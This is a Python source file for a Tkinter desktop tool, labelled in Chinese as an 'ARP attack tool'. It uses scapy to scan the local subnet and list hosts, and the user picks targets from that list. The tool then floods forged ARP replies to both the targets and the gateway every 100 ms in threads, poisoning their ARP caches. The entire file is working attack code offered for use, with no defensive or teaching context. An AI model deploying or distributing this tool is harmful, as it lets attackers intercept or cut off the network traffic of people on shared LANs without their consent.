import os
import time
import socket
import threading
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
from scapy.all import *
for line in os.popen('route print'):
    s = line.strip()
    if s.startswith("0.0.0.0"):
        iplist = s.split()
        gateway_ip = iplist[2]  # 网关
target_ip_list = []
List = []
all_ip=[]
stop=0
class ARPSpoofingApp:
    def __init__(self, root):
        # 获取点击的IP
        def on_item_click(event):
            global stop,target_ip_list
            if stop==1:
                self.stop_spoofing()
                stop=0
            item_id = self.tree.selection()
            item_values = self.tree.item(item_id, "values")
            List.append(item_values[0])
            target_ip_list = list(set(List))
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            for i in range(len(target_ip_list)):
                self.log2(target_ip_list[i])
        self.root = root
        self.root.title("ARP攻击工具")
        self.root.geometry("700x500")
        # 开始/结束ARP攻击
        self.start_button = tk.Button(
            root, text="开始ARP攻击", command=self.start_spoofing)
        self.start_button.pack()
        self.stop_button = tk.Button(
            root, text="停止ARP攻击", command=self.stop_spoofing, state=tk.DISABLED)
        self.stop_button.pack()
        # 清除ARP攻击列表
        self.qc_button = tk.Button(root, text="清除ARP攻击列表", command=self.cq)
        self.qc_button.place(x=580, y=0)
        # 扫描局域网
        self.scan_button = tk.Button(
            root, text="扫描局域网", command=self.scan_network)
        self.scan_button.place(x=0, y=30)
        self.qx_button = tk.Button(root, text="全选", command=self.qxip)
        self.qx_button.place(x=0, y=0)
        # 帮助
        self.scan_button = tk.Button(root, text="帮助?", command=self.help)
        self.scan_button.place(x=640, y=30)
        # 打印扫描到的名单
        self.tree = ttk.Treeview(root, columns=("IP", "MAC"), show="headings")
        self.tree.heading("IP", text="IP名单")
        self.tree.heading("MAC", text="MAC名单")
        self.tree.pack(fill=tk.BOTH, expand=True)
        # 输出框
        self.log_label = tk.Label(root, text="输出:")
        self.log_label.pack()
        self.log_area = scrolledtext.ScrolledText(root, wrap="word", width=65, height=10)
        self.log_area.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        self.log_label2 = tk.Label(root, text="被攻击IP:")
        self.log_label2.pack()
        self.log_area2 = scrolledtext.ScrolledText(root, wrap="word", width=15, height=10)
        self.log_area2.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        # 清除log
        self.qcl_button = tk.Button(root, text="清除输出", command=self.qclog)
        self.qcl_button.place(x=580, y=30)
        # Status variables
        self.spoofing = False
        # 捕获鼠标点击
        self.tree.bind("<ButtonRelease-1>", on_item_click)
    def qxip(self):
        global target_ip_list
        if all_ip == []:
            self.log("错误:请扫描局域网")
            messagebox.showerror("错误:", "请扫描局域网")
            return
        target_ip_list=all_ip
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('当前选择的被攻击IP:')
        for i in range(len(target_ip_list)):
            self.log2(target_ip_list[i])
    def qclog(self):
        self.log_area.configure(state='normal')  # 解除禁用状态
        self.log_area.delete("1.0", tk.END)  # 执行删除操作
        self.log_area.configure(state='disabled')  # 恢复禁用状态
    # 定义清除ARP攻击列表函数
    def cq(self):
        global target_ip_list, List,stop
        target_ip_list = []
        List = []
        if stop == 1:
            self.stop_spoofing()
            stop = 0
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('已清除ARP攻击列表')
    def help(self):
        self.log('帮助:点击"扫描局域网"可以扫描局域网的主机')
        self.log('   点击"清除ARP攻击列表"可以清除保存的被攻击IP')
        self.log('   点击"清除输出"可以清除输出框中的内容')
        self.log('   点击"结束ARP"攻击可以结束ARP攻击')
        self.log('   点击"开始ARP"攻击可以自动进行ARP攻击')
        self.log('   点击"全选"可以自动选中所有IP')
        self.log('   默认发送ARP数据包间隔100毫秒')
    def start_spoofing(self):
        # 网关IP= self.gateway_ip_entry.get()
        if target_ip_list == []:
            self.log("错误:请点击 IP名单 中的某行或全选")
            messagebox.showerror("错误:", "请点击 IP名单 中的某行或全选")
            return
        self.spoofing = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.spoof_thread = threading.Thread(target=self.spoof)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()
        self.log(f"开始ARP攻击:被攻击IP = {target_ip_list}, 网关IP = {gateway_ip}")
    def stop_spoofing(self):
        global stop
        self.spoofing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("停止ARP攻击")
        stop = 0
    def spoof(self):
        global stop
        def arpsp(i):
            global stop
            if self.spoofing:
                stop=1
            else:
                stop=0
            target_ip = target_ip_list[i]
            self.log(f"开始发送ARP数据包:被攻击IP = {target_ip},网关IP = {gateway_ip},线程号{i}")
            while self.spoofing:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc=gateway_ip), verbose=0)
                # 发送arp数据包给被攻击IP
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /ARP(pdst=gateway_ip, psrc=target_ip), verbose=0)
                time.sleep(0.1)
        for i in range(len(target_ip_list)):
            thread = threading.Thread(target=arpsp, args=(i,))
            thread.start()
            # 每隔0.05秒启动一个线程
            time.sleep(0.05)
    def scan_network(self):
        # 清除treeview
        for row in self.tree.get_children():
            self.tree.delete(row)
        # 获得活动IP和接口
        local_ip = self.get_local_ip()
        if not local_ip:
            self.log("错误:应该没有找到IP")
            messagebox.showerror("错误:", "应该没有找到IP")
            return
        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
        self.log(f"扫描的网关/接口: {subnet}")
        # 创建扫描线程
        self.scan_button.config(state=tk.DISABLED)
        self.scan_thread = threading.Thread(target=self.perform_arp_scan, args=(subnet,))
        self.scan_thread.daemon = True
        self.scan_thread.start()
    def perform_arp_scan(self, subnet):
        global all_ip
        all_ip = []
        # 开始ARP扫描
        self.log("开始ARP扫描...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /ARP(pdst=subnet, psrc=gateway_ip), timeout=2, verbose=False)
        # 打印找到的主机在treeview中
        for _, rcv in ans:
            ip = rcv[ARP].psrc
            all_ip.append(ip)
            mac = rcv[Ether].src
            self.tree.insert("", tk.END, values=(ip, mac))
            self.log(f"找到的主机: IP = {ip}, MAC = {mac}")
        self.log("ARP扫描结束.")
        self.scan_button.config(state=tk.NORMAL)
    def get_local_ip(self):
        try:
            # Create a socket to get the local IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            self.log(f"Error getting local IP: {e}")
            return None
    def log(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area.config(state='normal')
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area.yview(tk.END)
    def log2(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area2.config(state='normal')
        self.log_area2.insert(tk.END, message + "\n")
        self.log_area2.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area2.yview(tk.END)
if __name__ == "__main__":
    root = tk.Tk()
    app = ARPSpoofingApp(root)
    root.mainloop()